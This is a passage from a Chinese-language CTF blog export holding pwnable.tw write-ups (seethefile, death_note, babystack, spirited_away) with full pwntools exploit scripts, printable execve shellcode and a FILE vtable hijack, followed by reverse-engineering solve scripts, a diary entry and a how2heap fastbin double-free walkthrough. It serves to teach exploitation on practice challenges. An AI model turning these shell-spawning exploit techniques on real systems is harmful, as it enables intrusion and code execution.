*tz == &apos;\\0&apos;) /* User specified the empty string; use UTC explicitly. */ tz = &quot;Universal&quot;; /* A leading colon means &quot;implementation defined syntax&quot;. We ignore the colon and always use the same algorithm: try a data file, and if none exists parse the 1003.1 syntax. */ if (tz &amp;&amp; *tz == &apos;:&apos;) ++tz; /* Check whether the value changed since the last run. */ if (old_tz != NULL &amp;&amp; tz != NULL &amp;&amp; strcmp (tz, old_tz) == 0) /* No change, simply return. */ return; if (tz == NULL) /* No user specification; use the site-wide default. */ tz = TZDEFAULT; tz_rules[0].name = NULL; tz_rules[1].name = NULL; /* Save the value of `tz&apos;. */ free (old_tz); old_tz = tz ? __strdup (tz) : NULL; /* Try to read a data file. */ __tzfile_read (tz, 0, NULL);//★带着TZ进入__tzfile_read函数 if (__use_tzfile) return;&lt;--无关代码省略--&gt;&#125;void__tzfile_read (const char *file, size_t extra, char **extrap)&#123; static const char default_tzdir[] = TZDIR; size_t num_isstd, num_isgmt; FILE *f; struct tzhead tzhead; size_t chars; size_t i; size_t total_size; size_t types_idx; size_t leaps_idx; int was_using_tzfile = __use_tzfile; int trans_width = 4; size_t tzspec_len; char *new = NULL; if (sizeof (time_t) != 4 &amp;&amp; sizeof (time_t) != 8) abort (); __use_tzfile = 0; if (file == NULL) /* No user specification; use the site-wide default. */ file = TZDEFAULT; else if (*file == &apos;\\0&apos;) /* User specified the empty string; use UTC with no leap seconds. */ goto ret_free_transitions; else &#123; /* We must not allow to read an arbitrary file in a setuid program. So we fail for any file which is not in the directory hierachy starting at TZDIR and which is not the system wide default TZDEFAULT. */ if (__libc_enable_secure &amp;&amp; ((*file == &apos;/&apos; &amp;&amp; memcmp (file, TZDEFAULT, sizeof TZDEFAULT) &amp;&amp; memcmp (file, default_tzdir, sizeof (default_tzdir) - 1)) || strstr (file, &quot;../&quot;) != NULL)) /* This test is certainly a bit too restrictive but it should catch all critical cases. */ goto ret_free_transitions; &#125; if (*file != &apos;/&apos;) &#123; const char *tzdir; tzdir = getenv (&quot;TZDIR&quot;);//★从环境变量TZDIR中读取目录 if (tzdir == NULL || *tzdir == &apos;\\0&apos;) tzdir = default_tzdir; if (__asprintf (&amp;new, &quot;%s/%s&quot;, tzdir, file) == -1) goto ret_free_transitions; file = new; &#125; /* If we were already using tzfile, check whether the file changed. */ struct stat64 st; if (was_using_tzfile &amp;&amp; stat64 (file, &amp;st) == 0 &amp;&amp; tzfile_ino == st.st_ino &amp;&amp; tzfile_dev == st.st_dev &amp;&amp; tzfile_mtime == st.st_mtime) goto done; /* Nothing to do. */ /* Note the file is opened with cancellation in the I/O functions disabled and if available FD_CLOEXEC set. */ f = fopen (file, &quot;rce&quot;);//★打开文件 最后是通过malloc读取文件内容到heap上的，所以我们只需要控制TZ 和 TZDIR 就能读取flag内容到heap上；（类似于函数源码漏洞？） printf_chk 源码 12345678910111213141516171819202122/* Write formatted output to stdout from the format string FORMAT. */int___printf_chk (int flag, const char *format, ...)&#123; va_list ap; int done; _IO_acquire_lock_clear_flags2 (stdout); if (flag &gt; 0) stdout-&gt;_flags2 |= _IO_FLAGS2_FORTIFY; va_start (ap, format); done = vfprintf (stdout, format, ap); va_end (ap); if (flag &gt; 0) stdout-&gt;_flags2 &amp;= ~_IO_FLAGS2_FORTIFY; _IO_release_lock (stdout); return done;&#125;ldbl_strong_alias (___printf_chk, __printf_chk) printf_chk 格式化字符串漏洞。。。神奇、、 seethefile第一次见FILE题，学习一下 题目功能 1234567891011int menu()&#123; puts(&quot;---------------MENU---------------&quot;); puts(&quot; 1. Open&quot;); puts(&quot; 2. Read&quot;); puts(&quot; 3. Write to screen&quot;); puts(&quot; 4. Close&quot;); puts(&quot; 5. Exit&quot;); puts(&quot;----------------------------------&quot;); return printf(&quot;Your choice :&quot;);&#125; open打开文件，read读入0x18f的数据，如果文件名或读入的数据中没有‘flag’ 或 ‘FLAG’，就能够write到屏幕上，close关闭文件，exit时让输入姓名，会溢出。 分析后面给了一个明显的溢出，也就是我们的切入点，gdb调试发现name在bss段，后面只有一个指向文件的fp指针，意图很明显。我们可以先读取/map/self/maps 来获取程序的段信息，虽然能读入的信息较少，但是足以获得heap基地址以用来得到libc基地址。至于fp指针，需要将其覆盖并继续溢出伪造一个FILE结构体，fp指针就是指向这个结构体以避免程序错误退出，同时将伪造的虚表上的vtable该为system，fclose即可即可调用system。 exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from pwn import *context.log_level = &apos;debug&apos;#sh = process(&apos;./seethefile&apos;)sh = remote(&apos;chall.pwnable.tw&apos;, 10200)elf = ELF(&apos;./seethefile&apos;)libc = ELF(&apos;./libc_32.so.6&apos;)def open(name): sh.recvuntil(&apos;Your choice :&apos;) sh.sendline(&apos;1&apos;) sh.recvuntil(&apos;see :&apos;) sh.sendline(name)def read(): sh.recvuntil(&apos;Your choice :&apos;) sh.sendline(&apos;2&apos;)def write(): sh.recvuntil(&apos;Your choice :&apos;) sh.sendline(&apos;3&apos;)def close(): sh.recvuntil(&apos;Your choice :&apos;) sh.sendline(&apos;4&apos;)def exit(con): sh.recvuntil(&apos;Your choice :&apos;) sh.sendline(&apos;5&apos;) sh.recvuntil(&apos;Leave your name :&apos;) sh.sendline(con)open(&apos;/proc/self/maps&apos;)read()write()sh.recvline()sh.recvline()sh.recvline()heap = int(sh.recvline()[:8],16)success(&apos;heap: &apos;+hex(heap))libc.address = int(sh.recvline()[:8],16)+0x1000success(&apos;libc_base: &apos;+hex(libc.address))system = libc.symbols[&apos;system&apos;]close()pay = &apos;\\x00&apos;*32 + p32(0x0804B300)pay+=&apos;\\x00&apos;*(0x80-4)file = &apos;\\xff\\xff\\xff\\xff;$0\\x00&apos;.ljust(0x48,&apos;\\x00&apos;)file = file.ljust(0x94,&apos;\\x00&apos;) //在 libc2.23 版本下，32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8;pay+=filepay+=p32(0x0804B300+0x98)pay+=p32(system)*21#vtableexit(pay)sh.interactive() death_note话说这边的题难度真是飘忽不定。。 题目123456789101112131415161718192021int menu()&#123; puts(&quot;-----------------------------------&quot;); puts(&quot; DeathNote &quot;); puts(&quot;-----------------------------------&quot;); puts(&quot; 1. Add a name &quot;); puts(&quot; 2. show a name on the note &quot;); puts(&quot; 3. delete a name int the note &quot;); puts(&quot; 4. Exit &quot;); puts(&quot;-----------------------------------&quot;); return printf(&quot;Your choice :&quot;);&#125;# checksec death_note[*] &apos;/root/pwnable/death_note1/death_note&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments 分析题目的功能就是menu上的那样，不过在里面add的时候，index是自己选的，而且没有任何限制， 所以是有希望随便输入负数，将name也就是我们要输入的shellcode往上覆盖到got表来get shell。 输入的内容会进行检查，必须是可打印字符且最长为0x50，所以shellcode也需要在限制条件之内。shellcode可以使用metasploit自带的msfvenom来生成。 12 exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from pwn import *sh = process(&apos;./death_note&apos;)sh = remote(&apos;chall.pwnable.tw&apos;, 10201)def add(idx,con): sh.sendline(&apos;1&apos;) sh.recvuntil(&apos;Index :&apos;) sh.sendline(str(idx)) sh.recvuntil(&apos;Name :&apos;) sh.sendline(con)def dele(idx): sh.sendline(&apos;3&apos;) sh.recvuntil(&apos;Index :&apos;) sh.sendline(str(idx))pay = asm(&apos;&apos;&apos;/* execve(&apos;/bin///sh&apos;,0,0)*/push 0x68push 0x732f2f2fpush 0x6e69622fpush esppop ebx /*set ebx to &apos;/bin///sh&apos;*/push edxdec edxdec edx /*set dl to 0xfe*/xor [eax+32],dl /*decode int 0x80*/xor [eax+33],dl /*decode int 0x80*/inc edxinc edx /*recover edx to 0*/push edxpop ecx /*set ecx to 0*/push 0x40pop eaxxor al,0x4b /*set eax to 0xb*//*int 0x80*/&apos;&apos;&apos;)+&apos;\\x33\\x7e&apos;add(-19,pay)dele(-19)sh.interactive() babystack终于有时间继续做了、、 题目保护全开。。。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; _QWORD *v3; // rcx __int64 v4; // rdx char des; // [rsp+0h] [rbp-60h] __int64 buf; // [rsp+40h] [rbp-20h] __int64 v8; // [rsp+48h] [rbp-18h] char v9; // [rsp+50h] [rbp-10h] mmap_for_proc(); files[0] = open(&quot;/dev/urandom&quot;, 0); read(files[0], &amp;buf, 0x10uLL); v3 = IsMmap_ptr; v4 = v8; *IsMmap_ptr = buf; v3[1] = v4; close(files[0]); while ( 1 ) &#123; write(1, &quot;&gt;&gt; &quot;, 3uLL); _read_chk(0LL, &amp;v9, 0x10LL, 0x10LL); if ( v9 == &apos;2&apos; ) break; if ( v9 == &apos;3&apos; ) &#123; if ( password_inuse ) read_to_des(&amp;des); else puts(&quot;Invalid choice&quot;); &#125; else if ( v9 == &apos;1&apos; ) &#123; if ( password_inuse ) password_inuse = 0; else login(&amp;buf); &#125; else &#123; puts(&quot;Invalid choice&quot;); &#125; &#125; if ( !password_inuse ) exit(0); if ( memcmp(&amp;buf, IsMmap_ptr, 0x10uLL) ) JUMPOUT(loc_100B); return 0LL;&#125;int __fastcall login(const char *buf)&#123; size_t len; // rax char s; // [rsp+10h] [rbp-80h] printf(&quot;Your passowrd :&quot;); read_int(&amp;s, 0x7Fu); len = strlen(&amp;s); if ( strncmp(&amp;s, buf, len) ) return puts(&quot;Failed !&quot;); password_inuse = 1; return puts(&quot;Login Success !&quot;);&#125;int __fastcall read_to_des(char *des)&#123; char src; // [rsp+10h] [rbp-80h] printf(&quot;Copy :&quot;); read_int(&amp;src, 0x3Fu); strcpy(des, &amp;src); return puts(&quot;It is magic copy !&quot;);&#125; 分析main函数刚开始随机得到0x10个字节的数据并将其复制到buf处，并将全局变量指针*IsMmap_ptr指向该内存。read_chk读入参数，1-login(与随机得到的0x10个字节进行比较输入字节长度len的密码是否正确)或清除密码标志位密码，2-退出，3-检查密码标志位，为1则可读入0x3f字节的数据复制到des处 问题： login时可以不输入密码，直接回车可以跳过判定；或者以/x00开头跳过判定；或者可以依次爆破得到随机数password。 strcpy将src处的值复制到des，靠的是识别末尾处的/x00截断，而read_int并不会自动给加上/x00，因为输入字节的限制，看上去感觉并不会溢出，但是因为login函数用的是同一个栈段，所以有希望在src[0x3f]处将其置为非/x00，这样strcpy便会产生溢出。 为了getshell，rop不太可能–canary的存在，使得可能爆破出来的canary在最后会有/x00截断，这样strcpy就没法溢出到返回地址处了。所以应该要使用Onegadget一发入魂，但是libc地址搞不出来。。。。 得到大佬的思路：strcpy后原来的buf处变为两个libc中的地址，将其泄露计算libc基地址即可（ps：这一步仍有问题） exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384# one_gadget ./libc_64.so.6 0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints: rax == NULL0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xef6c4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf0567 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)constraints: [rsp+0x70] == NULLfrom pwn import *context.log_level = &apos;debug&apos;sh = process(&apos;./babystack&apos;)libc = ELF(&apos;./libc_64.so.6&apos;)bin = ELF(&apos;./babystack&apos;)one_gadget_offset = 0x45216def copy(): sh.recvuntil(&apos;&gt;&gt; &apos;) sh.sendline(&apos;3&apos;) sh.recvuntil(&apos;Copy :&apos;) sh.send(s)def login(pwd,lo=1): if lo: sh.send(&apos;1&apos;+&apos;a&apos;*15) else: sh.send(&apos;1&apos;) sh.recvuntil(&apos;Your passowrd :&apos;) sh.send(pwd) return sh.recvuntil(&apos;&gt;&gt; &apos;)def guess(length,secret=&apos;&apos;): for i in range(length): for q in range(1,256): if &apos;Success&apos; in login(secret+chr(q)+&apos;\\n&apos;,False): secret+=chr(q) sh.sendline(&apos;1&apos;) sh.recvuntil(&apos;&gt;&gt; &apos;) break return secretdef logout(): sh.sendline(&apos;1&apos;) sh.recvuntil(&apos;&gt;&gt; &apos;)# 爆破随机数secret = guess(16)# 绕过login，将src[0x3f]设置为非0，并将随机数位置变为libc的地址login(&apos;\\x00&apos;+&apos;a&apos;*0x57)copy(&apos;a&apos;*0x40)logout()# strcpy溢出泄露buf位置的libcbase = u64(guess(6,&apos;a&apos;*16+&apos;1&apos;+&apos;a&apos;*7)[24:]+&apos;\\x00\\x00&apos;)-324-libc.symbols[&apos;setvbuf&apos;] //泄漏的位置有点诡异。。。one_gadget_addr = one_gadget_offset + base## 覆盖返回地址到one_gadget_addr 得到shellpay = &apos;\\x00&apos; + &apos;a&apos; * 0x3f + secret + &apos;a&apos; *0x18 + p64(one_gadget_addr)login(pay)copy(&apos;a&apos;*0x40)sh.sendline(&apos;2&apos;)sh.interactive() spirited_away比较简短的一个程序，不过好久没看题了。。考试实习忙的一批 题目123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566int survey()&#123; char v1; // [esp+10h] [ebp-E8h] size_t nbytes; // [esp+48h] [ebp-B0h] size_t v3; // [esp+4Ch] [ebp-ACh] char s; // [esp+50h] [ebp-A8h] int age; // [esp+A0h] [ebp-58h] void *name; // [esp+A4h] [ebp-54h] int reason; // [esp+A8h] [ebp-50h] nbytes = 0x3C; v3 = 0x50;LABEL_2: memset(&amp;s, 0, 0x50u); name = malloc(0x3Cu); printf(&quot;\\nPlease enter your name: &quot;); fflush(stdout); read(0, name, nbytes); printf(&quot;Please enter your age: &quot;); fflush(stdout); __isoc99_scanf(&quot;%d&quot;, &amp;age); printf(&quot;Why did you came to see this movie? &quot;); fflush(stdout); read(0, &amp;reason, v3); fflush(stdout); printf(&quot;Please enter your comment: &quot;); fflush(stdout); read(0, &amp;s, nbytes); ++cnt; printf(&quot;Name: %s\\n&quot;, name); printf(&quot;Age: %d\\n&quot;, age); printf(&quot;Reason: %s\\n&quot;, &amp;reason); //leak printf(&quot;Comment: %s\\n\\n&quot;, &amp;s); fflush(stdout); sprintf(&amp;v1, &quot;%d comment so far. We will review them as soon as we can&quot;, cnt); puts(&amp;v1); puts(&amp;::s); fflush(stdout); if ( cnt &gt; 199 ) &#123; puts(&quot;200 comments is enough!&quot;); fflush(stdout); exit(0); &#125; while ( 1 ) &#123; printf(&quot;Would you like to leave another comment? &lt;y/n&gt;: &quot;); fflush(stdout); read(0, &amp;choice, 3u); if ( choice == &apos;Y&apos; || choice == &apos;y&apos; ) &#123; free(name); goto LABEL_2; &#125; if ( choice == &apos;N&apos; || choice == &apos;n&apos; ) break; puts(&quot;Wrong choice.&quot;); fflush(stdout); &#125; puts(&quot;Bye!&quot;); return fflush(stdout);&#125; 分析题目疯狂使用fflush(stdout),容易让人产生怀疑。。前面均使用read读入，不会在结尾加任何东西，但是在输出时使用printf会泄露栈上的内容，也就有希望得到libc基地址和栈地址；第二个漏洞比较隐蔽，看了v神的思路，自己调试了半天，才终于看出这个漏洞. 1sprintf(&amp;v1, &quot;%d comment so far. We will review them as soon as we can&quot;, cnt); 这一句看上去是没什么问题，但是在输出时，1,10,100占的位数并不相同，因为应该是把cnt以字符串形式来输出的，这样达到100次及以上之后，最后一个字母n溢出到了nbytes的位置，把原来的0x3c变成了0x6e,而这个nbytes是控制后面输入的comment的长度的，comment可以溢出到name指针的位置就能控制这个指针任意地址free，可以将其修改至栈上，之后分配name时就可以将其分配到栈上写入system(‘/bin/sh’)，rop得到shell。 exp鉴于gdb还是不能与pwntools一起调试，各个地址不能得到准确值，所以之后搞好了再写完整的exp 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from pwn import *context.log_level = &apos;debug&apos;sh = process(&apos;./spirited_away&apos;)bin = ELF(&apos;./spirited_away&apos;)libc = ELF(&apos;./libc_32.so.6&apos;)def comment(name,age,reason,comments): sh.recvuntil(&quot;name: &quot;) sh.sendline(name) sh.recvuntil(&quot;age: &quot;) sh.sendline(str(age)) sh.recvuntil(&quot;movie? &quot;) sh.sendline(reason) sh.recvuntil(&quot;comment: &quot;) sh.sendline(comments)comment(&apos;sir&apos;,19,&apos;a&apos;*16,&apos;b&apos;*2)sh.recvuntil(&apos;a&apos;*16)io_file_sync9 = sh.recv(4)#gdb.attach(sh)libc.address = u32(io_file_sync9) - libc.sym[&apos;_IO_file_sync&apos;]-9success(&quot;libc_addr = &quot; + hex(libc.address))sh.recvuntil(&apos;Would you like to leave another comment? &lt;y/n&gt;: &apos;)sh.send(&apos;y&apos;)comment(&apos;sir&apos;,19,&apos;a&apos;*0x50,&apos;b&apos;*2)sh.recvuntil(&apos;a&apos;*0x50)stack_addr = u32(sh.recv(4))- 0x28success(&quot;stack_addr = &quot; + hex(stack_addr))#gdb.attach(sh)sh.recvuntil(&apos;Would you like to leave another comment? &lt;y/n&gt;: &apos;)sh.send(&apos;y&apos;)for i in range(100): comment(&quot;sir&quot;,19,&apos;a&apos;*0x48,&apos;b&apos;*59) sh.recvuntil(&quot;Would you like to leave another comment? &lt;y/n&gt;: &quot;) sh.send(&apos;y&apos;)print hex(stack_addr)#gdb.attach(sh)rea = p32(0)+p32(0x41)+&apos;A&apos;*56+p32(0)+p32(0x41)pay = &apos;c&apos;*80 + &apos;bbbb&apos; + p32(stack_addr)+p32(0)+p32(0x41)comment(&apos;sir&apos;,19,rea, pay)gdb.attach(sh)sh.recvuntil(&quot;Would you like to leave another comment? &lt;y/n&gt;: &quot;)sh.send(&apos;y&apos;)pay = &apos;bbbb&apos; +p32(libc.sym[&apos;system&apos;]) + &apos;bbbb&apos;+p32(libc.search(&apos;/bin/sh\\x00&apos;).next())comment(pay, 19, &apos;a&apos;*0x20, &apos;b&apos;*2)gdb.attach(sh)sh.recvuntil(&quot;Would you like to leave another comment? &lt;y/n&gt;: &quot;)sh.send(&apos;n&apos;)#gdb.attach(sh)sh.interactive()","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"http://siriuswhiter.tk/tags/heap/"},{"name":"stack","slug":"stack","permalink":"http://siriuswhiter.tk/tags/stack/"}]},{"title":"Jarvis Oj-reverse","slug":"jarvis-oj-reverse","date":"2018-11-06T08:01:46.000Z","updated":"2019-03-14T10:01:37.184Z","comments":true,"path":"2018/11/06/jarvis-oj-reverse/","link":"","permalink":"http://siriuswhiter.tk/2018/11/06/jarvis-oj-reverse/","excerpt":"","text":"稍微学学逆向 FindKey 拿到文件顺手就往ida里拖，结果说是bin文件，所以还是乖乖将他拖到了kali里，file查看文件属性，是个pyc？（仿佛想到了某入群题） 将pyc还原成py文件 发现一个简单的加密过程（不过还是有点没太明白那个 +- &amp; 的执行顺序） 直接上wp 1234567891011import syslookup = [ 196, 153, 149, 206, 17, 221, 10, 217, 167, 18, 36, 135, 103, 61, 111, 31, 92, 152, 21, 228, 105, 191, 173, 41, 2, 245, 23, 144, 1, 246, 89, 178, 182, 119, 38, 85, 48, 226, 165, 241, 166, 214, 71, 90, 151, 3, 109, 169, 150, 224, 69, 156, 158, 57, 181, 29, 200, 37, 51, 252, 227, 93, 65, 82, 66, 80, 170, 77, 49, 177, 81, 94, 202, 107, 25, 73, 148, 98, 129, 231, 212, 14, 84, 121, 174, 171, 64, 180, 233, 74, 140, 242, 75, 104, 253, 44, 39, 87, 86, 27, 68, 22, 55, 76, 35, 248, 96, 5, 56, 20, 161, 213, 238, 220, 72, 100, 247, 8, 63, 249, 145, 243, 155, 222, 122, 32, 43, 186, 0, 102, 216, 126, 15, 42, 115, 138, 240, 147, 229, 204, 117, 223, 141, 159, 131, 232, 124, 254, 60, 116, 46, 113, 79, 16, 128, 6, 251, 40, 205, 137, 199, 83, 54, 188, 19, 184, 201, 110, 255, 26, 91, 211, 132, 160, 168, 154, 185, 183, 244, 78, 33, 123, 28, 59, 12, 210, 218, 47, 163, 215, 209, 108, 235, 237, 118, 101, 24, 234, 106, 143, 88, 9, 136, 95, 30, 193, 176, 225, 198, 197, 194, 239, 134, 162, 192, 11, 70, 58, 187, 50, 67, 236, 230, 13, 99, 190, 208, 207, 7, 53, 219, 203, 62, 114, 127, 125, 164, 179, 175, 112, 172, 250, 133, 130, 52, 189, 97, 146, 34, 157, 120, 195, 45, 4, 142, 139] pwda = [ 188, 155, 11, 58, 251, 208, 204, 202, 150, 120, 206, 237, 114, 92, 126, 6, 42]pwdb = [53,222,230,35,67,248 226,216,17,209,32,2,181,200,171,60,108]flag = &quot; &quot;for i in range (0,17): flag += chr(lookup[i + pwdb[i]] - pwda[i] &amp; 255 )f = flag[::-1]print(f) 对od产生了深深的抗拒！！ 除了打开会报毒，用起来整个电脑都卡炸了！！ 差点gg stheasy没什么套路。。简单的加密就完事了,不过知道了ida可以使用shift+e 批量提取数据。。不用苦逼的一个个写了。 脚本： 1234567891011a = [0x48,0x5d,0x8d,0x24,0x84,0x27,0x99,0x9f,0x54,0x18,0x1e,0x69,0x73,0x33,0x15,0x72,0x8d,0x33,0x24,0x63,0x21,0x54,0x0c,0x78,0x78,0x78,0x78,0x78,0x1b]b = &apos;lk2j9Gh&#125;AgfY4ds-a6QW1#k5ER_T[cvLbV7nOm3ZeX&#123;CMt8SZo]U&apos;c = &apos;&apos;for i in range(29): c+= b[a[i]/3-2]print c $ python ctf2wp.py kctf&#123;YoU_hAVO-GOt-fLg_233333&#125; hello还是简单的加密，mach-o 文件，ida分析一下， 还是简单的处理，直接上脚本 12345678910111213cat wp.py v2 = (0x20 &gt;&gt; 2 )^ 0x41a=[ 0x41, 0x10, 0x11, 0x11, 0x1B, 0x0A, 0x64, 0x67, 0x6A, 0x68, 0x62, 0x68, 0x6E, 0x67, 0x68, 0x6B, 0x62, 0x3D, 0x65, 0x6A, 0x6A, 0x3D, 0x68, 0x04, 0x05, 0x08, 0x03, 0x02, 0x02, 0x55, 0x08, 0x5D, 0x61, 0x55, 0x0A, 0x5F, 0x0D, 0x5D, 0x61, 0x32, 0x17, 0x1D, 0x19, 0x1F, 0x18, 0x20, 0x04, 0x02, 0x12, 0x16,0x1E, 0x54, 0x20, 0x13, 0x14, 0x00, 0x00]b = &apos;&apos;for i in range(55): b += chr((a[i]-2)^v2) v2+=1print b $ python wp.py vDDCTF-5943293119a845e9bbdbde5a369c1f50@didichuxing.com 软件密码破解-1如果可以定位到关键函数的话其实还是挺简单的，ida全是函数无从下手，od 将程序跑起来，中文字符串搜索中能看到有个你赢了到了地址之后，稍微往上翻便可以确定到关键判断的地方 12345678910111213141516171819202101191C51 |. /7E 16 jle short CTF_100_.01191C6901191C53 |. |B9 F8773001 mov ecx,CTF_100_.013077F8 ; 在此输入口令：01191C58 |. |8BC3 mov eax,ebx01191C5A |. |2BCB sub ecx,ebx01191C5C |. |8D6424 00 lea esp,dword ptr ss:[esp]01191C60 |&gt; |8A1401 /mov dl,byte ptr ds:[ecx+eax]01191C63 |. |3010 |xor byte ptr ds:[eax],dl01191C65 |. |40 |inc eax01191C66 |. |4E |dec esi01191C67 |.^|75 F7 \\jnz short CTF_100_.01191C60 --》 对输入的字符串分别xor01191C69 |&gt; \\813B 1B1C1746 cmp dword ptr ds:[ebx],0x46171C1B01191C6F |. 0F85 E7000000 jnz CTF_100_.01191D5C01191C75 |. 817B 04 F4FD2&gt;cmp dword ptr ds:[ebx+0x4],0x3020FDF401191C7C |. 0F85 DA000000 jnz CTF_100_.01191D5C01191C82 |. 817B 08 B70C8&gt;cmp dword ptr ds:[ebx+0x8],0x7E8E0CB701191C89 |. 0F85 CD000000 jnz CTF_100_.01191D5C01191C8F |. 807B 0C 78 cmp byte ptr ds:[ebx+0xC],0x7801191C93 |. 0F85 C3000000 jnz CTF_100_.01191D5C01191C99 |. 807B 0D DE cmp byte ptr ds:[ebx+0xD],0xDE --》 xor后的值进行判断01191C9D |. 0F85 B9000000 jnz CTF_100_.01191D5C 很明显就是xor之后比较一下就行了，直接上脚本 12345678910a = [0x28,0x57,0x64 ,0x6B ,0x93,0x8F ,0x65 ,0x51 ,0xE3 ,0x53 ,0xE4 ,0x4E ,0x1A ,0xFF]b = [0x1b,0x1c,0x17,0x46,0xf4,0xfd,0x20,0x30,0xb7,0x0c,0x8e,0x7e,0x78,0xde]c = &apos;&apos;for i in range(len(a)): c += chr(a[i]^b[i])print c $ python 1wp.py 3Ks-grEaT_j0b!","categories":[{"name":"RE","slug":"re","permalink":"http://siriuswhiter.tk/categories/re/"}],"tags":[{"name":"RE","slug":"re","permalink":"http://siriuswhiter.tk/tags/re/"}]},{"title":"diary-20181027","slug":"diary-20181027","date":"2018-10-27T02:42:19.000Z","updated":"2018-10-27T03:03:57.266Z","comments":true,"path":"2018/10/27/diary-20181027/","link":"","permalink":"http://siriuswhiter.tk/2018/10/27/diary-20181027/","excerpt":"","text":"或许真的是极尽苦难的一周。 也是一事无成的一周。 少有的一个星期什么也干不成，任何一件本应该简简单单的事情都会动辄四五个小时而迎来没有任何变化的结果。 虚拟机上周已被搞得一塌糊涂，真的是失去才知道原来环境配置的多么棒。仅仅为了装pwndbg，将整个gdb给搞出了问题，并且无力回天。 再之后为了装docker，看了许许多多的教程，又是大片大片的时间丢失，结果最后在角落里找到的方法，仅仅只用在src文件中加上docker的源地址，update就好了，心力交瘁。 虚拟机装go的环境还算简单，没有太大的麻烦。而想着不能每次都打开虚拟机来写go，再加上意图要和同学搞个英才工程的python的团队项目，就想直接搞个vscode加上各个语言的插件呗，事实证明，这真是一个错误的选择，各种奇奇怪怪的报错，环境配置，乱到不行的目录，还是解决不了，两天就这样再次流失。 所以还是选择了jetbrain家的pycharm和goland，pycharm倒是本本分分，goland却又是环境配置，还有项目的目录什么的，搞来搞去，goland的terminal又无法打开，寻找答案无果，重新安装，无果。抱着不准备管的心态，又突然不知道为什么就好了。。。蜜汁计算机。 不出意外的话下个月还得去打一场工控比赛，为此又得学一下PLC的逆向，目前看来资料少的可怜，尽力而为吧。","categories":[{"name":"diary","slug":"diary","permalink":"http://siriuswhiter.tk/categories/diary/"}],"tags":[{"name":"diary","slug":"diary","permalink":"http://siriuswhiter.tk/tags/diary/"}]},{"title":"Introduction to pwn2.2-fastbin_dup_consolidate","slug":"introduction-to-pwn2-2-fastbin-dup-consolidate","date":"2018-10-18T08:43:27.000Z","updated":"2019-01-26T04:31:01.176Z","comments":true,"path":"2018/10/18/introduction-to-pwn2-2-fastbin-dup-consolidate/","link":"","permalink":"http://siriuswhiter.tk/2018/10/18/introduction-to-pwn2-2-fastbin-dup-consolidate/","excerpt":"","text":"比较神奇的一个利用。pwntools —&gt; cyclic cyclic_findi locals fastbin_dup_consolidate原理 当创建一个0x20-0x80大小的chunk并free的话，该chunk会被放入fastbins，此时如果再次free便会报错；但是如果此时分配一个比较大的chunk（起码smallbin大小），便会触发程序的malloc_consolidate这个结果就是该chunk不再在fastbins中了，实际被转移到了unsortedbins。所以我们可以double free。 继续使用how2heap的例子来理解。12345678910111213141516171819#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;stdlib.h&gt;int main() &#123; void* p1 = malloc(0x40); void* p2 = malloc(0x40); fprintf(stderr, &quot;Allocated two fastbins: p1=%p p2=%p\\n&quot;, p1, p2); fprintf(stderr, &quot;Now free p1!\\n&quot;); free(p1); void* p3 = malloc(0x400); fprintf(stderr, &quot;Allocated large bin to trigger malloc_consolidate(): p3=%p\\n&quot;, p3); fprintf(stderr, &quot;In malloc_consolidate(), p1 is moved to the unsorted bin.\\n&quot;); free(p1); fprintf(stderr, &quot;Trigger the double free vulnerability!\\n&quot;); fprintf(stderr, &quot;We can pass the check in malloc() since p1 is not fast top.\\n&quot;); fprintf(stderr, &quot;Now p1 is in unsorted bin and fast bin. So we&apos;will get it twice: %p %p\\n&quot;, malloc(0x40), malloc(0x40));&#125; 运行结果： 12345678./fastbin_dup_consolidate Allocated two fastbins: p1=0x555dbdb57260 p2=0x555dbdb572b0Now free p1!Allocated large bin to trigger malloc_consolidate(): p3=0x555dbdb57300In malloc_consolidate(), p1 is moved to the unsorted bin.Trigger the double free vulnerability!We can pass the check in malloc() since p1 is not fast top.Now p1 is in unsorted bin and fast bin. So we&apos;will get it twice: 0x555dbdb57260 0x555dbdb57260 SleepyHolder简单程度和uaf相当hhhh 题目main 1234567891011121314151617181920212223242526272829303132333435363738394041424344void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123; int v3; // eax unsigned int buf; // [rsp+4h] [rbp-1Ch] int fd; // [rsp+8h] [rbp-18h] int v6; // [rsp+Ch] [rbp-14h] char s; // [rsp+10h] [rbp-10h] unsigned __int64 v8; // [rsp+18h] [rbp-8h] v8 = __readfsqword(0x28u); alarm0x3c(); // // puts(&quot;Waking Sleepy Holder up ...&quot;); fd = open(&quot;/dev/urandom&quot;, 0); read(fd, &amp;buf, 4uLL); buf &amp;= 0xFFFu; malloc(buf); // malloc something random to change heap_address every time // sleep(3u); puts(&quot;Hey! Do you have any secret?&quot;); puts(&quot;I can help you to hold your secrets, and no one will be able to see it :)&quot;); while ( 1 ) &#123; puts(&quot;1. Keep secret&quot;); puts(&quot;2. Wipe secret&quot;); puts(&quot;3. Renew secret&quot;); memset(&amp;s, 0, 4uLL); read(0, &amp;s, 4uLL); v3 = atoi(&amp;s); v6 = v3; switch ( v3 ) &#123; case 2: wipe_secret(); //仅仅把free掉并把该chunk的inuse位标记为0 break; case 3: renew_secret(); //重新改写1或者2的chunk，大小最大还是原来那么大。 break; case 1: keep_serect(); 